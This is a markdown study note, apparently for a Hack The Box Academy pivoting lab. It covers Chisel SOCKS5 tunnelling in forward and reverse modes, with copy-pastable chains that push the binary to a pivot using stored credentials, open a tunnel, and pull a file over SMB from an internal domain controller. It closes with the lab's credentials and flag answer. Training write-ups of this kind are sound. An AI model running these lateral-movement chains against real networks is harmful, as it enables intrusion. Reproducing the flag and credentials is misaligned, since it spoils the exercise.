# 13 — SOCKS5 Tunneling with Chisel

> Chisel creates a TCP/UDP tunnel over HTTP secured with SSH. It's faster to set up than SSH dynamic forwarding and works through HTTP proxies. Two modes: forward (server on pivot) and reverse (server on attack host).

---

## How It Works

### Forward Mode (server on pivot)
```
Attack Host  [chisel client → creates SOCKS5 on 127.0.0.1:1080]
    │  HTTP/SSH tunnel to pivot:1234
    ▼
Ubuntu Pivot  [chisel server — listens on :1234]
    │  forwards SOCKS5 traffic into internal network
    ▼
172.16.5.0/23  (internal — reachable via proxychains)
```

### Reverse Mode (server on attack host)
```
Attack Host  [chisel server --reverse — listens on :1234, SOCKS5 on :1080]
    ▲  pivot calls OUT to attack host
    │
Ubuntu Pivot  [chisel client R:socks — calls back to attack host]
    │  pivot bridges SOCKS5 traffic into internal network
    ▼
172.16.5.0/23
```

**Use forward when:** pivot accepts inbound connections on a port
**Use reverse when:** inbound to pivot is firewalled — pivot calls out to you

---

## Who Runs What

| Mode | Attack Host | Pivot Host |
|------|-------------|------------|
| **Forward** | `chisel client` → SOCKS on :1080 | `chisel server -p 1234 --socks5` |
| **Reverse** | `chisel server --reverse -p 1234` → SOCKS on :1080 | `chisel client R:socks` |

proxychains config is the same for both: `socks5 127.0.0.1 1080`

---

## Setup — Building or Getting Chisel

**Option A — Build from source (requires Go):**
```bash
git clone https://github.com/jpillora/chisel.git
cd chisel && go build
```

**Option B — Download prebuilt binary (recommended — avoids glibc mismatch):**
```bash
# Check latest release at https://github.com/jpillora/chisel/releases
# Download matching arch for attack host (linux_amd64) and pivot (linux_amd64 or linux_386)
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz && mv chisel_linux_amd64 chisel && chmod +x chisel
```

> **glibc note:** If chisel errors on the target after transfer, the glibc versions differ. Use a prebuilt binary from an older release that matches the target's glibc, or build on the target directly.

**Transfer to pivot:**
```bash
sshpass -p 'HTB_@cademy_stdnt!' scp -o StrictHostKeyChecking=no \
  ./chisel ubuntu@PIVOT_IP:~/
```

---

## Forward Mode (Chisel Server on Pivot)

**Step 1 — Start server on pivot:**
```bash
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
# Server fingerprint and "Listening on http://0.0.0.0:1234" confirms it's running
```

**Step 2 — Connect client from attack host:**
```bash
./chisel client -v 10.129.202.64:1234 socks
# Creates SOCKS5 proxy on 127.0.0.1:1080
```

**Step 3 — Update proxychains config:**
```bash
# /etc/proxychains4.conf — change the last line:
socks5  127.0.0.1 1080
```

**Step 4 — Use proxychains to reach internal network:**
```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /cert:ignore /dynamic-resolution
proxychains nmap -sT -Pn -p 22,80,443,3389 172.16.5.19
```

---

## Reverse Mode (Chisel Server on Attack Host)

Use this when inbound connections to the pivot are blocked.

**Step 1 — Start server on attack host:**
```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
# "Reverse tunnelling enabled" confirms reverse mode is active
```

**Step 2 — Connect client from pivot (calls OUT to attack host):**
```bash
ubuntu@WEB01:~$ ./chisel client -v 10.10.14.17:1234 R:socks
# "SSH connected" confirms tunnel is up
```

**Step 3 — Update proxychains config (same as forward):**
```bash
socks5  127.0.0.1 1080
```

**Step 4 — Same proxychains workflow:**
```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /cert:ignore /dynamic-resolution
```

---

## proxychains Config (both modes)

Edit `/etc/proxychains4.conf` — replace the last proxy line:

```
[ProxyList]
# socks4  127.0.0.1 9050   ← comment out old line
socks5  127.0.0.1 1080
```

> Note: The module references `/etc/proxychains.conf` but Kali uses `/etc/proxychains4.conf`.

---

## Full Copy-Pastable Chain — Forward Mode

```bash
# 1. Get chisel on attack host
wget -q https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz && mv chisel_linux_amd64 chisel && chmod +x chisel

# 2. Transfer to pivot
sshpass -p 'HTB_@cademy_stdnt!' scp -o StrictHostKeyChecking=no \
  ./chisel ubuntu@PIVOT_IP:~/

# 3. Start chisel server on pivot (in background SSH session)
sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@PIVOT_IP \
  './chisel server -v -p 1234 --socks5' &

# 4. Connect chisel client on attack host
sleep 3 && ./chisel client -v PIVOT_IP:1234 socks &

# 5. Update proxychains
sudo sed -i 's/socks4.*9050/socks5 127.0.0.1 1080/' /etc/proxychains4.conf

# 6. Use
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /cert:ignore /dynamic-resolution
```

## Full Copy-Pastable Chain — Reverse Mode

```bash
# 1. Start chisel server on attack host
LHOST=$(ip -br a | grep tun0 | awk '{print $3}' | cut -d/ -f1)
sudo ./chisel server --reverse -v -p 1234 --socks5 &

# 2. Run chisel client on pivot (calls back to attack host)
sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@PIVOT_IP \
  "./chisel client -v $LHOST:1234 R:socks" &

# 3. Update proxychains (same)
sudo sed -i 's/socks4.*9050/socks5 127.0.0.1 1080/' /etc/proxychains4.conf

# 4. Use
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /cert:ignore /dynamic-resolution
```

---

## Chisel vs SSH -D vs Sshuttle

| | `ssh -D` | Chisel | Sshuttle |
|--|---------|--------|---------|
| Protocol | SSH | HTTP + SSH | SSH |
| Requires SSH on pivot | Yes | No | Yes |
| Works through HTTP proxy | No | Yes | No |
| Sudo required | No | No (forward) / Yes (reverse on attack host) | Yes |
| SOCKS version | 4/5 | 5 | N/A (iptables) |
| proxychains needed | Yes | Yes | No |

---

## Triage

| Symptom | Fix |
|---------|-----|
| `chisel` errors on target after transfer | glibc mismatch — use older prebuilt binary from GitHub releases |
| `connection refused` on client connect | Chisel server not running on pivot, or wrong port |
| proxychains can't reach internal hosts | Wrong SOCKS version in config — must be `socks5`, not `socks4` |
| `sudo` needed for chisel server | Only needed for `--reverse` mode on attack host (to bind port 1234) |
| Chisel client shows `SSH connected` but proxy doesn't work | Port 1080 not updated in proxychains.conf |
| Very slow through tunnel | Normal — HTTP-over-SSH adds overhead; use `-q` flag to suppress verbose logs |

---

## Key Takeaways

1. **Forward = server on pivot, Reverse = server on attack host.** Reverse is used when the pivot can't accept inbound connections.
2. **SOCKS5 on 127.0.0.1:1080** — same proxychains workflow as `ssh -D` after setup.
3. **No SSH required on the pivot** — Chisel only needs HTTP reachability, making it useful against targets without SSH.
4. **glibc mismatch** is a common issue — always test with a prebuilt binary first before building from source.
5. **Works through HTTP proxies** — if the pivot is behind a corporate HTTP proxy, Chisel's HTTP transport can traverse it.

---

## Lab Solution — Section 13 Skills (May 8, 2026)

**Pivot host:** `10.129.202.64` (ACADEMY-PIVOTING-LINUXPIV) — IP changes per spawn
**Pivot creds:** `ubuntu : HTB_@cademy_stdnt!`
**Internal target:** `172.16.5.19` — DC, `victor : pass@123`
**Flag file:** `C:\Users\victor\Documents\flag.txt.txt` (double extension — actual filename on disk)

### Q1 — Flag from victor's Documents via chisel SOCKS5 tunnel → `Th3$eTunne1$@rent8oring!`

**Verified full chain (all from attack host):**

```bash
# 1. Download chisel (prebuilt — avoids glibc issues)
curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz \
  -o /tmp/chisel.gz && gunzip /tmp/chisel.gz && chmod +x /tmp/chisel

# 2. Transfer to pivot
sshpass -p 'HTB_@cademy_stdnt!' scp -o StrictHostKeyChecking=no \
  /tmp/chisel ubuntu@10.129.202.64:~/

# 3. Start chisel server on pivot (SOCKS5 on :1234)
sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@10.129.202.64 \
  './chisel server -v -p 1234 --socks5' &
sleep 4  # wait for server to start

# 4. Connect chisel client — creates SOCKS5 on 127.0.0.1:1080
/tmp/chisel client -v 10.129.202.64:1234 socks &
sleep 4

# 5. Grab flag via SMB through the tunnel (no RDP needed)
proxychains4 -q -f <(echo -e "[ProxyList]\nsocks5 127.0.0.1 1080") \
  smbclient //172.16.5.19/C$ -U 'victor%pass@123' \
  -c 'get Users\victor\Documents\flag.txt.txt /tmp/flag13.txt' && cat /tmp/flag13.txt
```

> **Note:** The actual file is named `flag.txt.txt` (double extension) — `ls` shows it, `flag.txt` returns not found.

> **Proxychains inline config trick:** Use `-f <(echo -e "[ProxyList]\nsocks5 127.0.0.1 1080")` to avoid modifying `/etc/proxychains4.conf` permanently. The chisel tunnel uses port **1080** (SOCKS5), not the default 9050 (SOCKS4) in the Kali config.

**Flag:** `Th3$eTunne1$@rent8oring!`

---

## References

- Previous: [12-DNS_Tunneling_with_Dnscat2.md](12-DNS_Tunneling_with_Dnscat2.md)
- Next: [14-ICMP_Tunneling_with_SOCKS.md](14-ICMP_Tunneling_with_SOCKS.md)
- Chisel GitHub: https://github.com/jpillora/chisel
- Chisel releases: https://github.com/jpillora/chisel/releases
